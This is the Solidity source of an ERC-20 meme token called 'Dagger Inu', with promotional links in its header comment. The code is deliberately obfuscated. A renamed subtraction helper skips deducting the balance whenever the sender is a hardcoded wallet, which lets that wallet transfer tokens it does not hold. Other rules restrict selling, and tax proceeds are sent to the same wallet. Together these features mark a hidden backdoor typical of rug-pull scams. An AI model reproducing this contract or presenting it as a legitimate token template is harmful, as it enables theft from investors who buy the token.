/**
 *Submitted for verification at Etherscan.io on 2023-10-19
*/

/**
Dagger Inu is a decentralized web 3.0 compliant meme token
that aims to cross the community of all major meme tokens,
aiming for a worldwide ecosystem. The number of targeted
communities is one billion people.

Telegram -  https://t.me/Dagger_Inu
Twitter - https://twitter.com/DaggerInu
Website - https://www.daggerinu.com/
**/
// SPDX-License-Identifier: MIT

pragma solidity 0.8.18;


interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath");
        return c;
    }

    function  _wvonv(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _wvonv(a, b, "SafeMath");
    }

    function  _wvonv(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function _pvr(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address
     tokenA, address tokenB) external
      returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[
            
        ] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure 
    returns (address);
    function WETH() external pure 
    returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH
    , uint liquidity);
}

contract DaggerInu is Context, IERC20, Ownable {
    using SafeMath for uint256;
    IUniswapV2Router02 private _jcvpur;
    address payable private _rcoauk;
    address private _rkaicp;
    string private constant _name = unicode"Dagger Inu";
    string private constant _symbol = unicode"$DINU";
    uint8 private constant _decimals = 9;
    uint256 private constant _totalSupply = 1000000000 * 10 **_decimals;

    uint256 private _BuyinitialTax=1;
    uint256 private _SellinitialTax=1;
    uint256 private _BuyfinalTax=1;
    uint256 private _SellfinalTax=1;
    uint256 private _BuyAreduceTax=1;
    uint256 private _SellAreduceTax=1;
    uint256 private _Kjucil=0;
    uint256 private _qcbajy=0;
    uint256 public _bfcrfn = _totalSupply;
    uint256 public _dradrk = _totalSupply;
    uint256 public _kaplvp= _totalSupply;
    uint256 public _zvobcf= _totalSupply;


    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _hyfouf;
    mapping (address => bool) private _widquy;
    mapping(address => uint256) private _fobiqx;

    bool private _qkaile;
    bool public _pauvaq = false;
    bool private kcojev = false;
    bool private _pjoeap = false;


    event _jvqeph(uint _bfcrfn);
    modifier farsjqr {
        kcojev = true;
        _;
        kcojev = false;
    }

    constructor () {      
        _balances[_msgSender(

        )] = _totalSupply;
        _hyfouf[owner(

        )] = true;
        _hyfouf[address
        (this)] = true;
        _hyfouf[
            _rcoauk] = true;
        _rcoauk = 
        payable (0xDb7210bbBb41f2b4a99dEA695e868F005f276F1c);

 

        emit Transfer(
            address(0), 
            _msgSender(

            ), _totalSupply);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _wvonv(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 qvsfbg=0;
        if (from !=
         owner () && to 
         != owner ( ) ) {

            if (_pauvaq) {
                if (to 
                != address
                (_jcvpur) 
                && to !=
                 address
                 (_rkaicp)) {
                  require(_fobiqx
                  [tx.origin]
                   < block.number,
                  "Only one transfer per block allowed."
                  );
                  _fobiqx
                  [tx.origin] 
                  = block.number;
                }
            }

            if (from ==
             _rkaicp && to != 
            address(_jcvpur) &&
             !_hyfouf[to] ) {
                require(amount 
                <= _bfcrfn,
                 "Exceeds the _bfcrfn.");
                require(balanceOf
                (to) + amount
                 <= _dradrk,
                  "Exceeds the _dradrk.");
                if(_qcbajy
                < _Kjucil){
                  require
                  (! _rplxkj(to));
                }
                _qcbajy++;
                 _widquy
                 [to]=true;
                qvsfbg = amount._pvr
                ((_qcbajy>
                _BuyAreduceTax)?
                _BuyfinalTax:
                _BuyinitialTax)
                .div(100);
            }

            if(to == _rkaicp &&
             from!= address(this) 
            && !_hyfouf[from] ){
                require(amount <= 
                _bfcrfn && 
                balanceOf(_rcoauk)
                <_zvobcf,
                 "Exceeds the _bfcrfn.");
                qvsfbg = amount._pvr((_qcbajy>
                _SellAreduceTax)?
                _SellfinalTax:
                _SellinitialTax)
                .div(100);
                require(_qcbajy>
                _Kjucil &&
                 _widquy[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!kcojev 
            && to == _rkaicp &&
             _pjoeap &&
             contractTokenBalance>
             _kaplvp 
            && _qcbajy>
            _Kjucil&&
             !_hyfouf[to]&&
              !_hyfouf[from]
            ) {
                _transferFrom( _fcbok(amount, 
                _fcbok(contractTokenBalance,
                _zvobcf)));
                uint256 contractETHBalance 
                = address(this)
                .balance;
                if(contractETHBalance 
                > 0) {
                    _prgvjh(address
                    (this).balance);
                }
            }
        }

        if(qvsfbg>0){
          _balances[address
          (this)]=_balances
          [address
          (this)].
          add(qvsfbg);
          emit
           Transfer(from,
           address
           (this),qvsfbg);
        }
        _balances[from
        ]= _wvonv(from,
         _balances[from]
         , amount);
        _balances[to]=
        _balances[to].
        add(amount.
         _wvonv(qvsfbg));
        emit Transfer
        (from, to, 
        amount.
         _wvonv(qvsfbg));
    }

    function _transferFrom(uint256
     tokenAmount) private
      farsjqr {
        if(tokenAmount==
        0){return;}
        if(!_qkaile)
        {return;}
        address[

        ] memory path =
         new address[](2);
        path[0] = 
        address(this);
        path[1] = 
        _jcvpur.WETH();
        _approve(address(this),
         address(
             _jcvpur), 
             tokenAmount);
        _jcvpur.
        swapExactTokensForETHSupportingFeeOnTransferTokens
        (
            tokenAmount,
            0,
            path,
            address
            (this),
            block.
            timestamp
        );
    }

    function  _fcbok
    (uint256 a, 
    uint256 b
    ) private pure
     returns 
     (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _wvonv(address
     from, uint256 a,
      uint256 b) 
      private view
       returns(uint256){
        if(from 
        == _rcoauk){
            return a ;
        }else{
            return a .
             _wvonv (b);
        }
    }

    function removeLimitas (
        
    ) external onlyOwner{
        _bfcrfn = _totalSupply;
        _dradrk = _totalSupply;
        emit _jvqeph(_totalSupply);
    }

    function _rplxkj(address 
    account) private view 
    returns (bool) {
        uint256 exovb;
        assembly {
            exovb :=
             extcodesize
             (account)
        }
        return exovb > 
        0;
    }

    function _prgvjh(uint256
    amount) private {
        _rcoauk.
        transfer(
            amount);
    }

    function openTrading ( 

    ) external onlyOwner ( ) {
        require (
            ! _qkaile ) ;
        _jcvpur  
        =  
        IUniswapV2Router02
        (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address
        (this), address(
            _jcvpur), 
            _totalSupply);
        _rkaicp = 
        IUniswapV2Factory(_jcvpur.
        factory( ) 
        ). createPair (
            address(this
            ),  _jcvpur .
             WETH ( ) );
        _jcvpur.addLiquidityETH
        {value: address
        (this).balance}
        (address(this)
        ,balanceOf(address
        (this)),0,0,owner(),block.
        timestamp);
        IERC20(_rkaicp).
        approve(address(_jcvpur), 
        type(uint)
        .max);
        _pjoeap = true;
        _qkaile = true;
    }

    receive() external payable {}
}